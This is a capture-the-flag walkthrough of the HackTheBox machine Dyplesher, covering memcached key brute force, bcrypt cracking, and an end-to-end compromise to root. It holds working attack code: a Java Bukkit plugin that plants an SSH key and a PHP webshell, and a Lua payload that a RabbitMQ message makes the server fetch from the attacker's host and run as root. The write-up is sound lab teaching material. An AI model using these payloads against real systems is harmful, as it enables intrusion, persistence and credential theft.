---
icon: cubes
cover: ../../../../.gitbook/assets/Screenshot 2026-03-02 115900.png
coverY: -5.247175615697357
---

# HTB-DYPLESHER

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning

Starting with rustscan to quickly identify open ports, then handing off to nmap for service and version detection.

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ rustscan -a 10.10.10.190 blah blah
```

```
Open 10.10.10.190:22
Open 10.10.10.190:80
Open 10.10.10.190:3000
Open 10.10.10.190:4369
Open 10.10.10.190:5672
Open 10.10.10.190:11211
Open 10.10.10.190:25562
Open 10.10.10.190:25565
Open 10.10.10.190:25672

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1
80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))
3000/tcp  open   http       Gogs self-hosted Git service
4369/tcp  open   epmd       Erlang Port Mapper Daemon
| epmd-info:
|   nodes:
|_    rabbit: 25672
5672/tcp  open   amqp       RabbitMQ 3.7.8 (0-9)
11211/tcp open   memcache?
25562/tcp open   unknown
25565/tcp open   minecraft?
25672/tcp open   unknown
```

The surface area here is significant. Breaking it down mentally: SSH is a credential endpoint to keep in mind. Port 80 is a custom PHP site. Port 3000 is Gogs, the self-hosted Git service. Port 4369 is the Erlang Port Mapper Daemon — it's already pointing at a RabbitMQ node on 25672. Port 5672 is the AMQP interface for that same RabbitMQ instance. Port 11211 is memcached. Port 25565 is responding with Minecraft version strings. There's a lot going on, and each service is a potential foothold or pivot point.

#### Virtual Host Discovery

The front page of port 80 references `test.dyplesher.htb` directly in the page content. Adding both hostnames to `/etc/hosts`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ echo "10.10.10.190 dyplesher.htb test.dyplesher.htb" >> /etc/hosts
```

A quick fuzz with ffuf doesn't turn up any additional vhosts beyond `test`, so those two are what we have.

#### Directory Brute Force — dyplesher.htb

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ffuf -c -r -u http://dyplesher.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 403 -e .php
```

```
login                   [Status: 200, Size: 4168]
register                [Status: 200, Size: 4168]
home                    [Status: 200, Size: 4168]
staff                   [Status: 200, Size: 4376]
robots.txt              [Status: 200, Size: 24]
index.php               [Status: 200, Size: 4241]
```

The `/login` and `/register` endpoints are interesting. `/register` just redirects back to `/login`, so registration is locked down. The `/staff` page shows three users: `MinatoTW`, `felamos`, and `yuntao` — these are almost certainly local system accounts.

#### Directory Brute Force — test.dyplesher.htb

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ffuf -c -r -u http://test.dyplesher.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 403
```

```
.git/HEAD               [Status: 200, Size: 23]
index.php               [Status: 200, Size: 239]
```

A `.git` directory exposed on `test.dyplesher.htb`. This is immediately significant — if the repository is accessible, we can dump the source code and potentially recover credentials or logic that was never meant to be public.

***

### Git Repository Dump — Credential Discovery

Using GitTools to dump the exposed `.git` directory:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ /opt/GitTools/Dumper/gitdumper.sh http://test.dyplesher.htb/.git/ ./gitrepo
```

```
[+] Downloaded: HEAD
[+] Downloaded: objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388
[+] Downloaded: objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
[+] Downloaded: objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0
```

Entering the directory and checking status shows that two files were deleted from the working tree. Restoring them with a hard reset:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher/gitrepo]
└─$ git status
On branch master
Changes not staged for commit:
        deleted:    README.md
        deleted:    index.php

┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher/gitrepo]
└─$ git restore README.md index.php
```

`README.md` is empty. `index.php` is where the gold is:

```php
<?php
if($_GET['add'] != $_GET['val']){
        $m = new Memcached();
        $m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
        $m->setSaslAuthData("felamos", "zxcvbnm");
        $m->addServer('127.0.0.1', 11211);
        $m->add($_GET['add'], $_GET['val']);
        echo "Done!";
}
else {
        echo "its equal";
}
?>
```

This is the form handler for the `test.dyplesher.htb` page, and it leaks credentials for memcached: `felamos:zxcvbnm`. Two things stand out here — first, it's explicitly setting `OPT_BINARY_PROTOCOL`, which means this memcached instance isn't using the default ASCII protocol. Second, it's calling `setSaslAuthData`, which confirms SASL authentication is required. That's why telnet to port 11211 just hung earlier — it was sending ASCII protocol frames to a binary-only endpoint that requires auth before it'll respond meaningfully.

***

### Memcached Enumeration — Key Brute Force

#### Understanding the Binary Protocol

Standard memcached enumeration tools expect the ASCII protocol, so `telnet` and `nc` won't work here. The memcached SASL authentication spec requires the binary protocol, and there's no way around that. We need a client that speaks binary AMQP.

There are two workable approaches. The first uses `memcached-cli` (Node.js) for interactive queries, and the second uses `memccat` (from `libmemcached-tools`) for scripting. Both work over the binary protocol with SASL credentials.

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ npm install -g memcached-cli

┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ memcached-cli felamos:zxcvbnm@10.10.10.190:11211
10.10.10.190:11211> get password
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
```

Guessing `password` worked. But that's not a repeatable method. The binary protocol doesn't support the `stats items` / `stats cachedump` commands that you'd normally use to enumerate keys over ASCII, so we need to brute force key names against a wordlist.

#### Scripted Key Brute Force

**Method 1 — Bash loop with memccat:**

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ cat /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | while read param; do \
  if res=$(memccat --username felamos --password zxcvbnm --servers 10.10.10.190 $param 2>/dev/null); then \
    echo -e "$param\n$res\n"; \
  fi; \
done
```

**Method 2 — Python with python-binary-memcached:**

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ pip3 install python-binary-memcached pwn
```

```python
#!/usr/bin/python3

import bmemcached
import sys
from pwn import *

brutefile = sys.argv[1]
connect = bmemcached.Client('10.10.10.190:11211', 'felamos', 'zxcvbnm')
brutefile = open(brutefile).readlines()
for param in brutefile:
    param = param.strip()
    result = str(connect.get(param))
    if 'None' not in result:
        print()
        log.info(f"Key -> {param}")
        log.success(result)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ python3 memcachebrute.py /usr/share/seclists/Discovery/Variables/secret-keywords.txt
```

Both methods return the same three keys:

```
[*] Key -> email
[+] MinatoTW@dyplesher.htb
    felamos@dyplesher.htb
    yuntao@dyplesher.htb

[*] Key -> password
[+] $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
    $2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
    $2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

[*] Key -> username
[+] MinatoTW
    felamos
    yuntao
```

We now have three usernames and three bcrypt hashes aligned to them by position. The three users match exactly what we saw on the `/staff` page.

#### Hash Cracking

Saving the hashes and running hashcat with mode 3200 (bcrypt):

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ cat memcache.hashes
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ hashcat -m 3200 memcache.hashes /usr/share/wordlists/rockyou.txt
```

```
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1
```

Only the middle hash cracks. Based on the ordering of the `username` and `password` keys, this maps to `felamos:mommy1`. The other two stay uncracked for now.

***

### Gogs Enumeration — Git Bundles

Trying `felamos:mommy1` against SSH and the `dyplesher.htb` login page both fail, but it works on Gogs at port 3000.

After logging in as `felamos`, two repositories become visible: `memcached` (the same code we already pulled from the `.git` dump) and `gitlab`. The `gitlab` repo's `README.md` says it's a GitLab backup, and there's a release attached: `repo.zip`.

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ wget http://dyplesher.htb:3000/felamos/gitlab/releases/download/1.0/repo.zip
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ unzip repo.zip -d repositories
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher/repositories]
└─$ find . -type f
./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
```

Four git bundles — packaged repository archives that can be cloned directly. Cloning each one:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher/repositories]
└─$ for bundle in $(find . -name "*.bundle"); do git clone -b master "$bundle"; done
```

Three of them turn out to be mirrors of public repos (VoteListener, phpbash, NightMiner). The fourth — `4e07...fce` — is different. Its commit is authored by `felamos@pm.me` and contains a full Minecraft server setup with custom configurations and plugins.

#### SQLite Hash from Minecraft Plugin Data

Inside the cloned `4e07...fce` repository, the `LoginSecurity` plugin directory contains an interesting file:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher/repositories/4e07...]
└─$ find . -name "users.db"
./plugins/LoginSecurity/users.db

┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher/repositories/4e07...]
└─$ sqlite3 plugins/LoginSecurity/users.db
SQLite version 3.33.0
sqlite> .headers on
sqlite> select * from users;
unique_user_id|password|encryption|ip
18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
```

Another bcrypt hash from a SQLite database inside a Minecraft plugin directory. Cracking it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ hashcat -m 3200 db.hash /usr/share/wordlists/rockyou.txt
$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6:alexis1
```

The cracked password is `alexis1`. This doesn't work for SSH with any of our three usernames, but trying it on `http://dyplesher.htb/login` as `felamos` (or `felamos@dyplesher.htb`) gets us in. This is the Dyplesher dashboard — a custom Minecraft server management panel.

***

### Shell as MinatoTW — Malicious Bukkit Plugin

#### Dashboard Reconnaissance

The dashboard has several functional pages. The one that matters most is the plugin management interface, which breaks down into three operations: `/home/add` to upload a plugin `.jar`, `/home/reload` to load or unload a named plugin, and `/home/reset` to restore the default plugin set.

The backend is clearly a Bukkit/Spigot Minecraft server — we saw `craftbukkit-1.8.jar` and `spigot-1.8.jar` in the git bundle. Bukkit plugins are Java archives that the server loads at runtime, executing their `onEnable()` method. If we can upload an arbitrary `.jar`, we get arbitrary code execution as whatever user is running the Minecraft server.

The `MANIFEST.MF` inside the bundled jars shows `Build-Jdk: 1.8.0_20`, so we need to target Java 8.

#### Building the Plugin

Setting up a Maven project in IntelliJ with Java 8 targeting. The key files are the main class and `plugin.yml`.

**plugin.yml:**

```yaml
name: coldfx
version: 1.0
main: htb.dyplesher.cfx.fusion
```

**Initial test — read /etc/passwd and confirm execution context:**

```java
package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

        try {
            String currentLine;
            BufferedReader reader = new BufferedReader(new FileReader("/etc/passwd"));
            while ((currentLine = reader.readLine()) != null) {
                getLogger().info(currentLine);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        getLogger().info(System.getProperty("user.name"));
    }

    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
```

Building with Maven package and uploading via the Add Plugin form, then loading via the Reload Plugin form with the name `coldfx`. The console output confirms the plugin runs as `MinatoTW`.

#### Weaponized Plugin — SSH Key Injection and Webshell Drop

```java
package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

        // Inject SSH public key
        try {
            FileWriter fw = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
            fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ... sn0x@sn0x");
            fw.close();
            getLogger().info("SSH key injected");
        } catch (IOException e) {
            getLogger().info("SSH injection failed");
        }

        // Drop PHP webshell
        String[] webPaths = {"/var/www/html", "/var/www/test", "/var/www/test.dyplesher.htb"};
        for (String path : webPaths) {
            try {
                FileWriter fw = new FileWriter(path + "/sn0x.php");
                fw.write("<?php system($_REQUEST['cmd']); ?>");
                fw.close();
                getLogger().info("Webshell written to " + path);
            } catch (IOException e) {
                // silently continue
            }
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
```

Uploading, loading. The console reports success for the SSH key injection and at least one webshell write. Verifying the webshell:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ curl http://test.dyplesher.htb/sn0x.php?cmd=id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

We have code execution as `MinatoTW`. Since we also wrote an SSH key into their home directory, we can get a proper shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ chmod 600 sn0x_key
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ssh -i sn0x_key MinatoTW@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
MinatoTW@dyplesher:~$
```

***

### Lateral Movement — MinatoTW to felamos

#### Enumeration

Checking groups immediately:

```
MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

`MinatoTW` is in the `wireshark` group. That's non-standard and clearly intentional. The wireshark group grants access to `dumpcap`, which has network capture capabilities through Linux capabilities rather than SUID:

```
MinatoTW@dyplesher:~$ getcap /usr/bin/dumpcap
/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip
```

The home directory has three folders: `backup`, `Cuberite`, and `paper`. The `backup` folder contains a cron-driven script:

```bash
#!/bin/bash
memcflush --servers 127.0.0.1 --username felamos --password zxcvbnm
memccp --servers 127.0.0.1 --username felamos --password zxcvbnm /home/MinatoTW/backup/*
```

This is what populates the memcached keys we enumerated earlier. It runs every minute per crontab. The `Cuberite` directory is a Cuberite Minecraft server instance — a C++ reimplementation of Minecraft with a Lua plugin API. This is going to matter later.

#### Packet Capture on Loopback

Starting a capture on the loopback interface where internal service traffic will flow:

```
MinatoTW@dyplesher:~$ dumpcap -i lo -w /dev/shm/dump.pcapng
Capturing on 'Loopback: lo'
File: /dev/shm/dump.pcapng
Packets captured: 237
```

Letting it run for a few minutes to capture the periodic cron activity, then pulling the file back. The egress firewall only allows outbound connections on ports 5672 and 11211, so SCP over the existing SSH session is the cleanest option:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ scp -i sn0x_key MinatoTW@10.10.10.190:/dev/shm/dump.pcapng .
```

#### Wireshark Analysis

Opening the capture in Wireshark and following TCP streams. The memcached traffic from the backup cron is there and visible. More interestingly, every couple of minutes there are AMQP packets on port 5672. Following one of these TCP streams reveals an AMQP authentication handshake where the client sends credentials in plaintext inside the PLAIN SASL mechanism:

The stream shows the body of the AMQP connection setup, where the `LOGIN` and `PASSWORD` fields are transmitted as part of the SASL PLAIN negotiation. Three sets of credentials come through:

```
MinatoTW : bihys1amFov
yuntao   : wagthAw4ob
felamos  : tieb0graQueg
```

These are the actual system account passwords being used to authenticate to RabbitMQ, transmitted in cleartext on the loopback interface.

#### SSH as felamos

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ssh felamos@10.10.10.190
felamos@10.10.10.190's password: tieb0graQueg
felamos@dyplesher:~$ cat user.txt
65a60e10...
```

***

### Privilege Escalation — felamos to root

#### The Note

Inside `felamos`'s home directory is a `yuntao` subdirectory with a single file:

```
felamos@dyplesher:~/yuntao$ cat send.sh
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on
plugin_data "Exchange" and "Queue". Just send url to download plugins and our
new code will review it and working plugins will be added to the server.' > /dev/pts/{}
```

The attack path is laid out clearly: publish a URL to the RabbitMQ `plugin_data` exchange/queue. The server will fetch that URL, and the content will be executed as a Cuberite plugin. Since Cuberite plugins are Lua scripts and Lua has `os.execute()`, this is a direct path to code execution as root (whoever is running the Cuberite server).

#### RabbitMQ Credentials

Looking back at the Wireshark capture, there's a second AMQP credential set that's distinct from the SSH account passwords — the credentials used to actually publish messages to the `plugin_data` queue. Revisiting the capture and filtering for the publishing traffic reveals `yuntao:EashAnicOc3Op` being used to authenticate to RabbitMQ for message publishing.

#### AMQP Publishing Tool

Downloading `amqp-publish`, a small Go binary for publishing messages to RabbitMQ from the command line:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ wget https://github.com/selency/amqp-publish/releases/download/v1.0.0/amqp-publish.linux-amd64
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ chmod +x amqp-publish.linux-amd64
```

Testing the connection with an empty exchange (which publishes directly to the queue via RabbitMQ's default exchange) and a body pointing to a local HTTP server. The exchange name matters here — setting `--exchange="plugin_data"` with `--routing-key="plugin_data"` doesn't trigger the fetch, but using `--exchange=""` with just `--routing-key="plugin_data"` does. The empty exchange uses RabbitMQ's built-in default exchange which routes by queue name.

First, confirming the server fetches URLs at all:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ python3 -m http.server 8080
```

From a separate terminal:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ./amqp-publish.linux-amd64 \
    --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" \
    --exchange="" \
    --routing-key="plugin_data" \
    --body="http://10.10.14.24:8080/test"
```

HTTP server gets a hit. The server is fetching URLs we publish.

#### Confirming Lua Execution

Writing a simple Lua test payload to verify code execution:

```lua
os.execute("touch /tmp/sn0x_rce")
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ./amqp-publish.linux-amd64 \
    --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" \
    --exchange="" \
    --routing-key="plugin_data" \
    --body="http://10.10.14.24:8080/test.lua"
```

After a short delay, checking from the `felamos` shell:

```
felamos@dyplesher:~$ ls -la /tmp/sn0x_rce
-rw-r--r-- 1 root root 0 Jun  3 23:00 /tmp/sn0x_rce
```

The file is owned by root. The Cuberite server is running as root, and our Lua code is being executed by it.

#### Malicious Lua Plugin — Root SSH Key Injection

```lua
os.execute("mkdir -p /root/.ssh")
os.execute("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtC3xSsz34olQ... sn0x@sn0x' >> /root/.ssh/authorized_keys")
os.execute("chmod 600 /root/.ssh/authorized_keys")
```

Publishing the payload URL:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ./amqp-publish.linux-amd64 \
    --uri="amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/" \
    --exchange="" \
    --routing-key="plugin_data" \
    --body="http://10.10.14.24:8080/root.lua"
```

HTTP server logs the fetch. After the Cuberite server processes and executes the plugin:

```
┌──(sn0x㉿sn0x)-[~/HTB/Dyplesher]
└─$ ssh -i sn0x_key root@10.10.10.190
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
root@dyplesher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@dyplesher:~# cat root.txt
5032fab9...
```

***

### Attack Flow

```
[test.dyplesher.htb]
        |
        v
Exposed .git directory
        |
        v
Recovered index.php source --> memcached credentials (felamos:zxcvbnm)
        |
        v
Memcached binary protocol brute force (key enumeration)
        |
        v
Three bcrypt hashes --> hashcat m3200 --> felamos:mommy1
        |
        v
Gogs login (felamos:mommy1) --> repo.zip download
        |
        v
Git bundle extraction --> Minecraft plugin data --> SQLite users.db
        |
        v
bcrypt hash --> hashcat m3200 --> alexis1
        |
        v
Dyplesher dashboard login (felamos:alexis1)
        |
        v
Bukkit plugin upload + load --> arbitrary Java execution as MinatoTW
        |
        v
SSH key injection into MinatoTW's authorized_keys
        |
        v
[SSH as MinatoTW]
        |
        v
wireshark group --> dumpcap cap_net_raw+eip
        |
        v
Loopback packet capture --> AMQP traffic analysis
        |
        v
Three cleartext passwords extracted --> felamos:tieb0graQueg
        |
        v
[SSH as felamos] --> user.txt
        |
        v
Additional AMQP credential in capture --> yuntao:EashAnicOc3Op (RabbitMQ publisher)
        |
        v
amqp-publish to plugin_data queue --> server fetches URL
        |
        v
Malicious Lua plugin (os.execute) --> execution as root
        |
        v
SSH key injected into /root/.ssh/authorized_keys
        |
        v
[SSH as root] --> root.txt
```

***

### Techniques

| Technique                                         | Where Used                                                    |
| ------------------------------------------------- | ------------------------------------------------------------- |
| Exposed `.git` directory dump (GitTools)          | Recovering `index.php` source from `test.dyplesher.htb`       |
| Memcached binary protocol with SASL auth          | Connecting to authenticated memcached on port 11211           |
| Memcached key brute force (bmemcached / memccat)  | Enumerating `email`, `password`, `username` keys              |
| bcrypt cracking — hashcat mode 3200               | Cracking memcached hashes and SQLite hash                     |
| Gogs authenticated enumeration                    | Discovering `repo.zip` release in the `gitlab` repository     |
| Git bundle extraction (`git clone`)               | Unpacking four `.bundle` archives from the GitLab backup      |
| SQLite database extraction                        | Recovering password hash from `LoginSecurity/users.db`        |
| Malicious Bukkit/Spigot plugin (Java)             | Achieving RCE as MinatoTW via Minecraft server plugin loading |
| SSH authorized\_keys injection                    | Writing attacker's public key to gain stable shell            |
| `dumpcap` via wireshark group + `cap_net_raw`     | Capturing loopback traffic on the box                         |
| AMQP traffic analysis (Wireshark)                 | Extracting cleartext SASL credentials for three accounts      |
| RabbitMQ message publishing (amqp-publish)        | Triggering server-side URL fetch via `plugin_data` queue      |
| Malicious Lua plugin via Cuberite                 | Achieving RCE as root through Cuberite's Lua plugin API       |
| SSH key injection to `/root/.ssh/authorized_keys` | Persisting root access                                        |
